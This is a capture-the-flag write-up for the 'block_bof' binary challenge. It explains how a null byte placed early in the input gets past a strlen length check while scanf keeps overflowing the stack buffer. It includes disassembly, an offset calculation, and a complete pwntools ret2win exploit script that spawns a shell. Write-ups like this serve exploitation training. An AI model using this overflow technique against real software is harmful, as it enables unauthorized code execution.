# CTF Writeup: block_bof

## Challenge Overview
**Challenge:** block_bof
**Category:** Pwn / Binary Exploitation
**Objective:** Bypass a length check constraint to exploit a buffer overflow and execute the `get_sehll` function.

## 1. Static Analysis
### Binary Properties
* **Arch:** x86-64 ELF
* **Canary:** Disabled (Crucial for simple stack overflows)
* **PIE:** Disabled (Addresses are constant)

### Code Logic
The `main` function performs the following steps:
1.  Asks for a name and reads it using `read` (safe).
2.  Asks for a "commnet" and reads it using `scanf` into a stack buffer at `rbp-0x30` (48 decimal).
3.  Calls `check(buffer)` to verify the input length.
4.  If the check passes, `main` returns.

### The Constraint (`check` function)
Disassembling `check` (at `0x401294`) reveals it uses `strlen` to verify the input:
```nasm
4012ab: call   strlen
4012b0: cmp    rax, 0xf        ; Compare length with 15
4012b4: jbe    4012cf          ; If len <= 15, return safely
...
4012ca: call   exit            ; Else, exit program
```
This prevents a standard overflow because we need more than 15 bytes to reach the return address.

## 2. Vulnerability Strategy
### Null Byte Injection
The vulnerability arises from the mismatch in how `scanf` and `strlen` handle data:
* **`scanf("%s")`**: Reads until whitespace. It **accepts** null bytes (`\x00`) as normal content.
* **`strlen()`**: Calculates length until the first null byte (`\x00`).

By placing a null byte within the first 15 characters of our payload, `strlen` will report a short length (passing the check), but `scanf` will continue writing our massive payload onto the stack, overwriting the return address.

### Offset Calculation
* Buffer Start: `rbp - 0x30` (48 bytes)
* Saved RBP: `rbp` (8 bytes)
* Return Address: `rbp + 0x8`
* **Total Offset:** 48 + 8 = **56 bytes**

## 3. Exploit Construction
We construct a payload of 56 garbage bytes followed by the address of `get_sehll`.

### Stack Layout & Null Byte Trick
```text
      Stack Growth (High Addresses)
            ^
            |
    +-----------------+  <-- Return Address (Offset 56)
    |   get_sehll     |      (Overwrites Ret Addr)
    +-----------------+
    |   RET Gadget    |  <-- Stack Alignment Fix (Optional but recommended)
    +-----------------+
    |   Padding...    |
    |   (40 bytes)    |
    +-----------------+
    |      \x00       |  <-- Null Byte (Stops strlen)
    +-----------------+
    |   "AAAAAAA"     |  <-- First 7 chars (strlen sees 7)
    +-----------------+
    |                 |  <-- Buffer Start (rbp - 0x30)
    +-----------------+
      Stack Growth (Low Addresses)
```

## 4. Run Exploit
Running the attached script sends this payload, tricking the `check` function and hijacking execution flow to spawn a shell.

### Exploit Script
```python
from pwn import *

# 1. Setup Context
exe = './block_bof'
elf = ELF(exe)
context.binary = exe

# 2. Start Process
# p = remote('IP', PORT) 
p = process(exe)

# 3. Addresses & Offsets
get_shell_addr = elf.symbols['get_sehll'] # 0x40125c
offset = 56

# ROP Gadget for Stack Alignment (MOVAPS issue)
# We need a simple 'ret' instruction to align the stack to 16 bytes before calling execve.
# ROPgadget --binary block_bof | grep ret
# Or simply use the ret at the end of main or any known ret.
ret_gadget = 0x4013bd 

# 4. Construct Payload
# 'A'*7 + \x00 (8 bytes) -> strlen sees 7.
# We need 56 bytes total. 
# 8 bytes used, need 48 more bytes of padding.
junk = b'A' * 7 + b'\x00' + b'B' * (offset - 8)

# Payload structure:
# [ Junk (56) ] [ RET Gadget ] [ get_sehll ]
payload = flat(
    junk,
    ret_gadget,     # Align stack
    get_shell_addr
)

# 5. Send Exploit
p.sendlineafter(b'name??', b'Hacker')
p.sendlineafter(b'commnet :', payload)

# 6. Interactive Shell
p.interactive()
```
